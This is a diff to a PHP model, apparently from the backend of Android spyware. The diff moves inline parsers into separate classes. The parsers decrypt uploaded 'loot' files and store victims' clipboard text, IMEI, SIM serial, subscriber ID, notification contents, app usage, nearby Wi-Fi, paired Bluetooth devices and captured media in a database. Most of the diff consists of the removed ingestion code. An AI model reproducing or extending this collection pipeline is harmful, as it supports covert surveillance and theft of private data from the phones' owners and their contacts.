@@ -5,9 +5,9 @@ namespace App\Models;
 use CodeIgniter\Model;
 
 /**
- * Mod_Parse_Advanced
+ * ParseAdvancedModel
  *
- * Handles decryption and DB ingestion for all 8 Advanced Data Extractors:
+ * Handles decryption and DB ingestion for all 8 AdvancedController Data Extractors:
  *   1. DeviceContextExtractor  → tbl_device_hardware_contexts
  *   2. NetworkInfoExtractor    → tbl_system_network_info + tbl_telemetry_wifi_networks_nearby
  *   3. AccountsExtractor       → tbl_accounts
@@ -17,12 +17,12 @@ use CodeIgniter\Model;
  *   7. BluetoothExtractor      → tbl_telemetry_bluetooth_devices + tbl_telemetry_bluetooth_devices_paired
  *   8. SensorProfileExtractor  → tbl_telemetry_sensors
  *
- * All methods follow the same pattern as Mod_Parse_Loot:
+ * All methods follow the same pattern as ParseLootModel:
  *   - Read encrypted file from WRITEPATH/uploads/text_dump/
- *   - Decrypt via Mod_Crypt::decode_content() (AES-128-CBC)
+ *   - Decrypt via CryptModel::decode_content() (AES-128-CBC)
  *   - Parse JSON and batch-insert, skipping duplicates
  */
-class Mod_Parse_Advanced extends Model
+class ParseAdvancedModel extends Model
 {
     /**
      * DeviceContextExtractor
@@ -30,51 +30,7 @@ class Mod_Parse_Advanced extends Model
      */
     public function parse_device_context(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            $battery      = $json['battery']  ?? [];
-            $locale       = $json['locale']   ?? [];
-            $extracted_at = $json['extracted_at'] ?? null;
-
-            $data = [
-                'owner_id'                   => $owner_id,
-                'device_id'                  => $device_id,
-                // Battery
-                'battery_level_percent'      => $json['battery_level']       ?? $battery['level_percent']        ?? null,
-                'battery_is_charging'        => isset($json['battery_is_charging']) ? ($json['battery_is_charging'] ? 1 : 0) : (isset($battery['is_charging']) ? ($battery['is_charging'] ? 1 : 0) : null),
-                'battery_plugged_usb'        => isset($json['battery_plugged_usb']) ? ($json['battery_plugged_usb'] ? 1 : 0) : (isset($battery['plugged_usb']) ? ($battery['plugged_usb'] ? 1 : 0) : null),
-                'battery_plugged_ac'         => isset($json['battery_plugged_ac'])  ? ($json['battery_plugged_ac'] ? 1 : 0)  : (isset($battery['plugged_ac'])  ? ($battery['plugged_ac'] ? 1 : 0)  : null),
-                'battery_temperature_celsius'=> $json['battery_temp']          ?? $battery['temperature_celsius']  ?? null,
-                'battery_voltage_mv'         => $json['battery_voltage']       ?? $battery['voltage_mv']           ?? null,
-                'battery_health'             => $json['battery_health']        ?? $battery['health']               ?? null,
-                // Clipboard
-                'clipboard_text'             => $json['clipboard_content']     ?? $json['clipboard_text']          ?? $json['clip_text'] ?? null,
-                // Locale
-                'locale_country'             => $json['device_country']        ?? $locale['country']               ?? null,
-                'locale_display_country'     => $locale['display_country']       ?? null,
-                'locale_language'            => $json['device_language']       ?? $locale['language']              ?? null,
-                'locale_display_language'    => $locale['display_language']      ?? null,
-                'locale_timezone'            => $json['device_timezone']       ?? $locale['timezone']              ?? null,
-                'locale_timezone_offset_ms'  => $json['device_timezone_offset'] ?? $locale['timezone_offset_ms']   ?? null,
-                // Metadata
-                'extracted_at'               => $extracted_at,
-                'created_at'                 => $dated,
-                'updated_at'                 => $dated,
-            ];
-
-            $this->db->table('tbl_device_hardware_contexts')->insert($data);
-            log_message('info', '[parse_device_context] Inserted 1 row from ' . $file_name);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_device_context] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\DeviceContextParser($this->db))->parse_device_context($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     // ─────────────────────────────────────────────────────────────────────────
@@ -85,95 +41,7 @@ class Mod_Parse_Advanced extends Model
      */
     public function parse_network_info(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            $wifi         = $json['current_wifi'] ?? [];
-            $cellular     = $json['cellular'] ?? [];
-            $extracted_at = $json['extracted_at'] ?? null;
-
-            $mainData = [
-                'owner_id'               => $owner_id,
-                'device_id'              => $device_id,
-                'is_connected'           => isset($json['is_connected'])  ? ($json['is_connected'] ? 1 : 0) : null,
-                'connection_type'        => $json['connection_type']       ?? null,
-                'is_roaming'             => isset($json['is_roaming'])    ? ($json['is_roaming'] ? 1 : 0) : null,
-                'network_operator_name'  => $json['network_operator_name'] ?? null,
-                'network_country_iso'    => $json['network_country_iso']   ?? null,
-                'sim_operator_name'      => $json['sim_operator_name']     ?? null,
-                'sim_country_iso'        => $json['sim_country_iso']       ?? null,
-                'sim_state'              => $json['sim_state']             ?? null,
-                'phone_type'             => $json['phone_type']            ?? null,
-                'device_imei'            => $json['device_imei']           ?? null,
-                'sim_serial'             => $json['sim_serial']            ?? null,
-                'subscriber_id'          => $json['subscriber_id']         ?? null,
-                // Current WiFi (flattened)
-                'wifi_ssid'              => $wifi['ssid']        ?? null,
-                'wifi_bssid'             => $wifi['bssid']       ?? null,
-                'wifi_link_speed'        => $wifi['link_speed']  ?? null,
-                'wifi_frequency'         => $wifi['frequency']   ?? null,
-                'wifi_rssi'              => $wifi['rssi']        ?? null,
-                'wifi_link_speed_mbps'   => $wifi['wifi_link_speed_mbps'] ?? $wifi['link_speed'] ?? null,
-                'wifi_frequency_mhz'     => $wifi['wifi_frequency_mhz'] ?? $wifi['frequency'] ?? null,
-                'wifi_channel'           => $wifi['wifi_channel'] ?? null,
-                'wifi_channel_width'     => $wifi['wifi_channel_width'] ?? null,
-                'wifi_noise'             => $wifi['wifi_noise'] ?? null,
-                'wifi_snr'               => $wifi['wifi_snr'] ?? null,
-                'wifi_standard'          => $wifi['wifi_standard'] ?? null,
-                'wifi_phy_mode'          => $wifi['wifi_phy_mode'] ?? null,
-                'wifi_tx_rate'           => $wifi['wifi_tx_rate'] ?? null,
-                'wifi_rx_rate'           => $wifi['wifi_rx_rate'] ?? null,
-                'wifi_retry_rate'        => $wifi['wifi_retry_rate'] ?? null,
-                'wifi_lost_packet_rate'  => $wifi['wifi_lost_packet_rate'] ?? null,
-                'cell_identity'          => json_encode($json['cell_identity'] ?? []),
-                'data_network_type'      => $json['data_network_type'] ?? null,
-                'is_5g_nsa'              => isset($cellular['is_5g_nsa']) ? ($cellular['is_5g_nsa'] ? 1 : 0) : 0,
-                'is_5g_sa'               => isset($cellular['is_5g_sa']) ? ($cellular['is_5g_sa'] ? 1 : 0) : 0,
-                'nr_ssb_frequency'       => $cellular['nr_ssb_frequency'] ?? null,
-                'nr_scs'                 => $cellular['nr_scs'] ?? null,
-                'nr_band'                => $cellular['nr_band'] ?? null,
-                'wifi_mac_address'       => $wifi['mac_address'] ?? null,
-                'wifi_ip_address'        => $wifi['ip_address']  ?? null,
-                'extracted_at'           => $extracted_at,
-                'created_at'             => $dated,
-                'updated_at'             => $dated,
-            ];
-
-            $this->db->table('tbl_system_network_info')->insert($mainData);
-            $networkInfoId = $this->db->insertID();
-
-            // Nearby WiFi child rows
-            $nearbyList = $json['network_list'] ?? $json['nearby_wifi'] ?? [];
-            if (!empty($nearbyList) && is_array($nearbyList) && $networkInfoId > 0) {
-                $nearbyBatch = [];
-                foreach ($nearbyList as $ap) {
-                    $nearbyBatch[] = [
-                        'network_info_id' => $networkInfoId,
-                        'owner_id'        => $owner_id,
-                        'ssid'            => $ap['ssid']         ?? null,
-                        'bssid'           => $ap['bssid']        ?? null,
-                        'capabilities'    => $ap['capabilities'] ?? null,
-                        'level'           => $ap['level']        ?? null,
-                        'frequency'       => $ap['frequency']    ?? null,
-                        'created_at'      => $dated,
-                    ];
-                }
-                if (!empty($nearbyBatch)) {
-                    $this->db->table('tbl_telemetry_wifi_networks_nearby')->insertBatch($nearbyBatch);
-                }
-            }
-
-            log_message('info', '[parse_network_info] Inserted network snapshot + ' . count($nearbyList) . ' nearby APs from ' . $file_name);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_network_info] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\DeviceContextParser($this->db))->parse_network_info($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     // ─────────────────────────────────────────────────────────────────────────
@@ -386,134 +254,7 @@ class Mod_Parse_Advanced extends Model
      */
     public function parse_app_usage(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            // Flexible detection of the data array
-            $usageRows = null;
-            if (isset($json['usage_list']) && is_array($json['usage_list'])) {
-                $usageRows = $json['usage_list'];
-            } elseif (isset($json['app_usage']) && is_array($json['app_usage'])) {
-                $usageRows = $json['app_usage'];
-            } elseif (isset($json['usage']) && is_array($json['usage'])) {
-                $usageRows = $json['usage'];
-            } elseif (is_array($json) && (isset($json[0]) || empty($json))) {
-                $usageRows = $json;
-            }
-
-            if ($usageRows === null) {
-                log_message('error', '[Mod_Parse_Advanced::parse_app_usage] Could not find usage data array in file: ' . $file_name);
-                return false;
-            }
-
-            // Composite injects both 'timestamp' and 'extracted_at' from the same
-            // extraction run; the extractor's own extracted_at (device ms) wins when present.
-            // Server clock is only a last-resort fallback for legacy files.
-            $extracted_at = $json['extracted_at'] ?? $json['timestamp'] ?? time() * 1000;
-            $seenPackages = [];
-            $inserted = 0;
-            $skipped = 0;
-
-            foreach ($usageRows as $app) {
-                // Flexible package key detection
-                $packageName = $app['package_name'] ?? $app['package'] ?? $app['name'] ?? null;
-                if (!$packageName) {
-                    $skipped++;
-                    continue;
-                }
-
-                // Batch duplicate check
-                if (in_array($packageName, $seenPackages)) {
-                    $skipped++;
-                    continue;
-                }
-
-                // Upsert logic: skip if identical snapshot already stored
-                $exists = $this->db->table('tbl_system_app_usage')
-                    ->where('owner_id', $owner_id)
-                    ->where('device_id', $device_id)
-                    ->where('package_name', $packageName)
-                    ->where('extracted_at', $extracted_at)
-                    ->countAllResults() > 0;
-
-                if ($exists) {
-                    $skipped++;
-                    continue;
-                }
-
-                $seenPackages[] = $packageName;
-
-                $appData = [
-                    'owner_id'              => $owner_id,
-                    'device_id'             => $device_id,
-                    'package_name'          => $packageName,
-                    'app_name'              => $app['app_name']             ?? null,
-                    'foreground_time_ms'    => $app['foreground_time_ms']   ?? $app['foreground_ms'] ?? $app['totalTimeInForeground'] ?? $app['total_time_in_foreground'] ?? $app['app_usage_time'] ?? $app['usage_time'] ?? $app['totalTimeVisible'] ?? $app['total_time_visible'] ?? $app['totalTime'] ?? $app['total_time'] ?? 0,
-                    'foreground_time_hours' => $app['foreground_time_hours'] ?? $app['foreground_hours'] ?? 0,
-                    'last_time_used'        => $app['last_time_used']       ?? $app['last_used'] ?? null,
-                    'is_system_app'         => isset($app['is_system_app']) ? ($app['is_system_app'] ? 1 : 0) : 0,
-                    'background_time_ms'    => $app['background_time_ms']    ?? 0,
-                    'interactive_time_ms'   => $app['interactive_time_ms']   ?? $app['foreground_time_ms'] ?? null,
-                    'screen_on_time_ms'     => $app['screen_on_time_ms']     ?? null,
-                    'keyguard_shown_time_ms'=> $app['keyguard_shown_time_ms']?? 0,
-                    'session_count'         => $app['session_count']         ?? 0,
-                    'session_durations_json' => json_encode($app['session_durations'] ?? []),
-                    'first_launch_of_day'  => $app['first_launch_of_day']   ?? null,
-                    'last_launch_of_day'   => $app['last_launch_of_day']    ?? null,
-                    'longest_session_ms'   => $app['longest_session_ms']    ?? null,
-                    'shortest_session_ms'  => $app['shortest_session_ms']   ?? null,
-                    'avg_session_ms'       => $app['avg_session_ms']        ?? null,
-                    'distinct_days_used'   => $app['distinct_days_used']    ?? null,
-                    'usage_by_hour_json'   => json_encode($app['usage_by_hour'] ?? []),
-                    'usage_by_dow_json'    => json_encode($app['usage_by_dow'] ?? []),
-                    'notification_seen_count' => $app['notification_seen_count'] ?? null,
-                    'notification_clicked_count' => $app['notification_clicked_count'] ?? null,
-                    'app_standby_bucket'   => $app['app_standby_bucket']    ?? null,
-                    'app_standby_reason'   => $app['app_standby_reason']    ?? null,
-                    'times_opened'         => $app['times_opened']          ?? null,
-                    'time_taken_formatted' => $app['time_taken_formatted']  ?? null,
-                    'extracted_at'          => $extracted_at,
-                    'created_at'            => $dated,
-                    'updated_at'            => $dated,
-                ];
-
-                $this->db->table('tbl_system_app_usage')->insert($appData);
-                $usageId = $this->db->insertID();
-                $inserted++;
-
-                // Insert session events from sessions_list or session_durations
-                if (!empty($app['session_durations']) && is_array($app['session_durations']) && $usageId > 0) {
-                    $sessBatch = [];
-                    foreach ($app['session_durations'] as $sd) {
-                        $sessBatch[] = [
-                            'app_usage_id' => $usageId,
-                            'owner_id'     => $owner_id,
-                            'event_type'   => 'session_duration',
-                            'timestamp'    => null,
-                            'session_start_ms' => $sd['start'] ?? null,
-                            'session_end_ms'   => $sd['end'] ?? null,
-                            'session_duration_ms' => $sd['duration_ms'] ?? null,
-                            'created_at'   => $dated,
-                        ];
-                    }
-                    if (!empty($sessBatch)) {
-                        $this->db->table('tbl_system_app_usage_sessions')->insertBatch($sessBatch);
-                    }
-                }
-            }
-
-            log_message('info', '[parse_app_usage] Processed ' . count($usageRows) . " apps from $file_name (Inserted: $inserted, Skipped: $skipped)");
-            return true;
-
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_app_usage] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\AppPermissionParser($this->db))->parse_app_usage($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     // ─────────────────────────────────────────────────────────────────────────
@@ -521,113 +262,10 @@ class Mod_Parse_Advanced extends Model
     /**
      * NotificationExtractor
      * File prefix: notifications_TIMESTAMP.enc
-     * NOTE: The payload is a raw JSON *array*, not an object.
      */
     public function parse_notifications(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated = date('Y-m-d H:i:s');
-
-            $jsonParsed = $this->payloadToArray($payload, $file_name);
-            if ($jsonParsed === null) return false;
-            $extractedAt = $jsonParsed['extracted_at'] ?? $jsonParsed['timestamp'] ?? null;
-            $notifications = null;
-            
-            if (isset($jsonParsed['notifications_list']) && is_array($jsonParsed['notifications_list'])) {
-                $notifications = $jsonParsed['notifications_list'];
-            } else {
-                $notifications = $jsonParsed;
-            }
-
-            if ($notifications === null || !is_array($notifications)) {
-                log_message('error', '[Mod_Parse_Advanced::parse_notifications] Invalid JSON (expected array or notifications_list): ' . $file_name);
-                return false;
-            }
-
-            $batchData = [];
-            $seenKeys  = [];
-            foreach ($notifications as $notif) {
-                if (!is_array($notif)) {
-                    continue;
-                }
-                $notifId    = $notif['id']        ?? null;
-                $notifTs    = $notif['timestamp'] ?? null;
-                $action     = $notif['action']    ?? null;
-
-                // Unique key for notifications: ID + Timestamp + Action
-                $key = "{$notifId}|{$notifTs}|{$action}";
-                if (in_array($key, $seenKeys)) {
-                    continue;
-                }
-
-                // Database duplicate check
-                $exists = $this->db->table('tbl_extracted_notifications')
-                    ->where('owner_id', $owner_id)
-                    ->where('device_id', $device_id)
-                    ->where('notification_id', $notifId)
-                    ->where('notification_timestamp', $notifTs)
-                    ->where('action', $action)
-                    ->countAllResults() > 0;
-
-                if (!$exists) {
-                    $seenKeys[] = $key;
-                    $batchData[] = [
-                        'owner_id'               => $owner_id,
-                        'device_id'              => $device_id,
-                        'notification_id'        => $notifId,
-                        'package_name'           => $notif['package']
-                            ?? $notif['packageName']
-                            ?? $notif['package_name']
-                            ?? null,
-                        'app_name'               => $notif['app_name'] ?? null,
-                        'title'                  => $notif['raw_title'] ?? $notif['title']    ?? null,
-                        'text'                   => $notif['raw_body']  ?? $notif['text']     ?? $notif['body'] ?? null,
-                        'sender'                 => $notif['sender'] ?? $notif['sender_name'] ?? $notif['from'] ?? null,
-                        'sub_text'               => $notif['sub_text'] ?? $notif['subText'] ?? null,
-                        'channel_id'             => $notif['channel_id'] ?? null,
-                        'channel_name'           => $notif['channel_name'] ?? null,
-                        'channel_importance'     => $notif['channel_importance'] ?? 0,
-                        'group_key'              => $notif['group_key'] ?? null,
-                        'sort_key'               => $notif['sort_key'] ?? null,
-                        'is_ongoing'             => isset($notif['is_ongoing']) ? ($notif['is_ongoing'] ? 1 : 0) : 0,
-                        'is_local_only'          => isset($notif['is_local_only']) ? ($notif['is_local_only'] ? 1 : 0) : 0,
-                        'color'                  => $notif['color'] ?? null,
-                        'badge_icon'             => $notif['badge_icon'] ?? null,
-                        'large_icon_base64'      => $notif['large_icon_base64'] ?? null,
-                        'actions'                => json_encode($notif['actions'] ?? []),
-                        'remote_input_history'   => json_encode($notif['remote_input_history'] ?? []),
-                        'people'                 => json_encode($notif['people'] ?? []),
-                        'shortcut_id'            => $notif['shortcut_id'] ?? null,
-                        'locus_id'               => $notif['locus_id'] ?? null,
-                        'bubble_metadata'        => $notif['bubble_metadata'] ?? null,
-                        'settings_text'          => $notif['settings_text'] ?? null,
-                        'timeout_after'          => $notif['timeout_after'] ?? null,
-                        'flags'                  => $notif['flags'] ?? 0,
-                        'suppressed_visual_effects' => $notif['suppressed_visual_effects'] ?? 0,
-                        'category'               => $notif['category'] ?? $notif['channel'] ?? $notif['channel_id'] ?? null,
-                        'visibility'             => $notif['visibility'] ?? null,
-                        'is_screen_notification' => self::resolveScreenNotificationFlag($notif),
-                        'notification_timestamp' => $notifTs,
-                        'action'                 => $action,
-                        'extracted_at'           => $extractedAt,
-                        'created_at'             => $dated,
-                        'updated_at'             => $dated,
-                    ];
-                }
-            }
-
-            if (!empty($batchData)) {
-                $this->db->table('tbl_extracted_notifications')->insertBatch($batchData);
-            }
-
-            log_message('info', '[parse_notifications] Inserted ' . count($batchData) . ' notification rows from ' . $file_name);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_notifications] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\AppPermissionParser($this->db))->parse_notifications($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     // ─────────────────────────────────────────────────────────────────────────
@@ -638,89 +276,7 @@ class Mod_Parse_Advanced extends Model
      */
     public function parse_bluetooth(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            $extracted_at = $json['extracted_at'] ?? null;
-
-            $btData = [
-                'owner_id'        => $owner_id,
-                'device_id'       => $device_id,
-                'is_enabled'      => isset($json['is_enabled']) ? ($json['is_enabled'] ? 1 : 0) : null,
-                'adapter_name'    => $json['adapter_name']    ?? null,
-                'adapter_address' => $json['adapter_address'] ?? null,
-                'paired_count'    => $json['paired_count']    ?? 0,
-                'extracted_at'    => $extracted_at,
-                'created_at'      => $dated,
-                'updated_at'      => $dated,
-            ];
-
-            $this->db->table('tbl_telemetry_bluetooth_devices')->insert($btData);
-            $bluetoothId = $this->db->insertID();
-
-            // Paired devices child rows
-            $btList = $json['bluetooth_list'] ?? $json['paired_devices'] ?? [];
-            if (!empty($btList) && is_array($btList) && $bluetoothId > 0) {
-                $pairedBatch = [];
-                foreach ($btList as $dev) {
-                    $pairedBatch[] = [
-                        'bluetooth_id' => $bluetoothId,
-                        'owner_id'     => $owner_id,
-                        'bt_name'      => $dev['name']       ?? null,
-                        'bt_address'   => $dev['address']    ?? null,
-                        'bt_type'      => $dev['type']       ?? null,
-                        'bond_state'   => $dev['bond_state'] ?? null,
-                        'alias'                  => $dev['alias']      ?? null,
-                        'device_class'           => $dev['device_class'] ?? null,
-                        'device_class_major'     => $dev['device_class_major'] ?? null,
-                        'device_class_minor'     => $dev['device_class_minor'] ?? null,
-                        'rssi'                   => $dev['rssi'] ?? 0,
-                        'tx_power'               => $dev['tx_power'] ?? null,
-                        'appearance'             => $dev['appearance'] ?? null,
-                        'uuids'                  => json_encode($dev['uuids'] ?? []),
-                        'manufacturer_data'      => $dev['manufacturer_data'] ?? null,
-                        'service_data'           => $dev['service_data'] ?? null,
-                        'address_type'           => $dev['address_type'] ?? null,
-                        'bond_state'             => $dev['bond_state'] ?? null,
-                        'bonding_attempt'        => isset($dev['bonding_attempt']) ? ($dev['bonding_attempt'] ? 1 : 0) : 0,
-                        'is_le'                  => isset($dev['is_le']) ? ($dev['is_le'] ? 1 : 0) : 0,
-                        'le_address'             => $dev['le_address'] ?? null,
-                        'le_address_type'        => $dev['le_address_type'] ?? null,
-                        'connection_state'       => $dev['connection_state'] ?? 0,
-                        'connection_interval_ms'  => $dev['connection_interval_ms'] ?? null,
-                        'connection_latency'     => $dev['connection_latency'] ?? null,
-                        'supervision_timeout_ms' => $dev['supervision_timeout_ms'] ?? null,
-                        'mtu'                    => $dev['mtu'] ?? null,
-                        'bt_phy'                 => $dev['phy'] ?? null,
-                        'phy_tx'                 => $dev['phy_tx'] ?? null,
-                        'phy_rx'                 => $dev['phy_rx'] ?? null,
-                        'data_length'            => $dev['data_length'] ?? null,
-                        'att_mtu'                => $dev['att_mtu'] ?? null,
-                        'bond_order'             => $dev['bond_order'] ?? 0,
-                        'last_seen_time'         => $dev['last_seen_time'] ?? null,
-                        'last_connected_time'    => $dev['last_connected_time'] ?? null,
-                        'connection_count'       => $dev['connection_count'] ?? 0,
-                        'total_bytes_sent'       => $dev['total_bytes_sent'] ?? 0,
-                        'total_bytes_received'   => $dev['total_bytes_received'] ?? 0,
-                        'created_at'   => $dated,
-                    ];
-                }
-                if (!empty($pairedBatch)) {
-                    $this->db->table('tbl_telemetry_bluetooth_devices_paired')->insertBatch($pairedBatch);
-                }
-            }
-
-            log_message('info', '[parse_bluetooth] Inserted BT snapshot + ' . count($btList) . ' paired devices from ' . $file_name);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_bluetooth] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\SensorsEnvironmentParser($this->db))->parse_bluetooth($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     // ─────────────────────────────────────────────────────────────────────────
@@ -731,100 +287,7 @@ class Mod_Parse_Advanced extends Model
      */
     public function parse_sensors(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            // Flexible detection of the data array
-            $sensorRows = null;
-            if (isset($json['sensors']) && is_array($json['sensors'])) {
-                $sensorRows = $json['sensors'];
-            } elseif (isset($json['sensors_list']) && is_array($json['sensors_list'])) {
-                $sensorRows = $json['sensors_list'];
-            } elseif (is_array($json) && (isset($json[0]) || empty($json))) {
-                $sensorRows = $json;
-            }
-
-            if ($sensorRows === null) {
-                log_message('error', '[Mod_Parse_Advanced::parse_sensors] Could not find sensor data array in file: ' . $file_name);
-                return false;
-            }
-
-            $extracted_at = $json['extracted_at'] ?? null;
-            $batchData    = [];
-            $seenKeys     = [];
-
-            foreach ($sensorRows as $sensor) {
-                $typeId = $sensor['type_id'] ?? null;
-                if ($typeId === null) continue;
-
-                // Batch duplicate check
-                if (in_array($typeId, $seenKeys)) {
-                    continue;
-                }
-
-                // Database duplicate check
-                $exists = $this->db->table('tbl_telemetry_sensors')
-                    ->where('owner_id', $owner_id)
-                    ->where('device_id', $device_id)
-                    ->where('type_id', $typeId)
-                    ->where('extracted_at', $extracted_at)
-                    ->countAllResults() > 0;
-
-                if (!$exists) {
-                    $seenKeys[] = $typeId;
-                    $batchData[] = [
-                        'owner_id'     => $owner_id,
-                        'device_id'    => $device_id,
-                        'sensor_name'  => $sensor['name']          ?? null,
-                        'vendor'       => $sensor['vendor']        ?? null,
-                        'type_id'      => $typeId,
-                        'type_string'  => $sensor['type_string']   ?? null,
-                        'version'      => $sensor['version']       ?? null,
-                        'maximum_range'=> $sensor['maximum_range'] ?? null,
-                        'resolution'   => $sensor['resolution']    ?? null,
-                        'power_ma'                  => $sensor['power_ma']      ?? null,
-                        'sensor_string_type'         => $sensor['sensor_string_type'] ?? $sensor['type_string'] ?? null,
-                        'min_delay_us'               => $sensor['min_delay_us'] ?? null,
-                        'max_delay_us'               => $sensor['max_delay_us'] ?? null,
-                        'fifo_reserved_event_count'   => $sensor['fifo_reserved_event_count'] ?? 0,
-                        'fifo_max_event_count'        => $sensor['fifo_max_event_count'] ?? 0,
-                        'is_wakeup'                  => isset($sensor['is_wakeup']) ? ($sensor['is_wakeup'] ? 1 : 0) : 0,
-                        'is_dynamic'                 => isset($sensor['is_dynamic']) ? ($sensor['is_dynamic'] ? 1 : 0) : 0,
-                        'is_additional_info'         => isset($sensor['is_additional_info']) ? ($sensor['is_additional_info'] ? 1 : 0) : 0,
-                        'reporting_mode'             => $sensor['reporting_mode'] ?? null,
-                        'required_permission'        => $sensor['required_permission'] ?? null,
-                        'permission_display_name'    => $sensor['permission_display_name'] ?? null,
-                        'flags'                      => $sensor['flags'] ?? 0,
-                        'direct_channel_type'        => $sensor['direct_channel_type'] ?? null,
-                        'direct_report_rates'        => json_encode($sensor['direct_report_rates'] ?? []),
-                        'additional_info'            => json_encode($sensor['additional_info'] ?? []),
-                        'calibration_params'         => json_encode($sensor['calibration_params'] ?? []),
-                        'mounting_matrix'            => json_encode($sensor['mounting_matrix'] ?? []),
-                        'drivetime_us'               => $sensor['drivetime_us'] ?? null,
-                        'event_time_ns'              => $sensor['event_time_ns'] ?? null,
-                        'sensor_max_range'           => $sensor['max_range'] ?? null,
-                        'extracted_at' => $extracted_at,
-                        'created_at'   => $dated,
-                        'updated_at'   => $dated,
-                    ];
-                }
-            }
-
-            if (!empty($batchData)) {
-                $this->db->table('tbl_telemetry_sensors')->insertBatch($batchData);
-            }
-
-            log_message('info', '[parse_sensors] Inserted ' . count($batchData) . ' sensor rows from ' . $file_name);
-            return true;
-
-        } catch (\Exception $e) {
-            log_message('error', '[parse_sensors] Exception: ' . $e->getMessage());
-            return false;
-        }
+        return (new \App\Libraries\Parsers\SensorsEnvironmentParser($this->db))->parse_sensors($payload, $owner_id, $device_id, $fileRecordId);
     }
 
     /**
@@ -834,7 +297,7 @@ class Mod_Parse_Advanced extends Model
     public function parse_captured_media(string $file_name, int $owner_id, string $device_id, int $fileRecordId = null, string $type = 'image'): bool
     {
         try {
-            $cryptModel = new Mod_Crypt();
+            $cryptModel = new CryptModel();
             $dated = date('Y-m-d H:i:s');
 
             // 1. Read encrypted file
@@ -925,106 +388,7 @@ class Mod_Parse_Advanced extends Model
      */
     public function parse_device_info(string|array $payload, int $owner_id, string $device_id, int $fileRecordId = null): bool
     {
-        try {
-            $file_name = is_string($payload) ? $payload : '(inline)';
-            $dated      = date('Y-m-d H:i:s');
-
-            $json = $this->payloadToArray($payload, $file_name);
-            if ($json === null) return false;
-
-            $extracted_at = $json['extraction_timestamp'] ?? null;
-
-            // Avoid duplicate snapshots for same device+timestamp
-            $exists = $this->db->table('tbl_device_profiles')
-                ->where('device_id', $device_id)
-                ->where('extraction_timestamp', $extracted_at)
-                ->countAllResults() > 0;
-
-            if ($exists) {
-                log_message('info', '[parse_device_info] Duplicate snapshot skipped for device: ' . $device_id);
-                return true;
-            }
-
-            $data = [
-                'device_model'                => $json['device_model']                ?? null,
-                'device_brand'                => $json['device_brand']                ?? null,
-                'device_manufacturer'         => $json['device_manufacturer']         ?? null,
-                'device_product'              => $json['device_product']              ?? null,
-                'device_device'               => $json['device_device']               ?? null,
-                'device_board'                => $json['device_board']                ?? null,
-                'device_hardware'             => $json['device_hardware']             ?? null,
-                'android_version'             => $json['android_version']             ?? null,
-                'android_sdk_int'             => $json['android_sdk_int']             ?? null,
-                'android_codename'            => $json['android_codename']            ?? null,
-                'android_incremental'         => $json['android_incremental']         ?? null,
-                'android_base_os'             => $json['android_base_os']             ?? null,
-                'android_security_patch'      => $json['android_security_patch']      ?? null,
-                'build_id'                    => $json['build_id']                    ?? null,
-                'build_type'                  => $json['build_type']                  ?? null,
-                'build_tags'                  => $json['build_tags']                  ?? null,
-                'build_fingerprint'           => $json['build_fingerprint']           ?? null,
-                'build_time'                  => $json['build_time']                  ?? null,
-                'build_user'                  => $json['build_user']                  ?? null,
-                'build_host'                  => $json['build_host']                  ?? null,
-                'build_display'               => $json['build_display']               ?? null,
-                'android_id'                  => $json['android_id']                  ?? null,
-                'display_width'               => $json['display_width']               ?? null,
-                'display_height'              => $json['display_height']              ?? null,
-                'display_density'             => $json['display_density']             ?? null,
-                'display_density_dpi'         => $json['display_density_dpi']         ?? null,
-                'display_scaled_density'      => $json['display_scaled_density']      ?? null,
-                'display_xdpi'                => $json['display_xdpi']                ?? null,
-                'display_ydpi'                => $json['display_ydpi']                ?? null,
-                'cpu_cores'                   => $json['cpu_cores']                   ?? null,
-                'cpu_abi'                     => $json['cpu_abi']                     ?? null,
-                'cpu_abis'                    => is_array($json['cpu_abis'] ?? null) ? implode(',', $json['cpu_abis']) : ($json['cpu_abis'] ?? null),
-                'memory_total_mb'             => $json['memory_total_mb']             ?? null,
-                'memory_free_mb'              => $json['memory_free_mb']              ?? null,
-                'internal_storage_total_gb'   => $json['internal_storage_total_gb']   ?? null,
-                'internal_storage_free_gb'    => $json['internal_storage_free_gb']    ?? null,
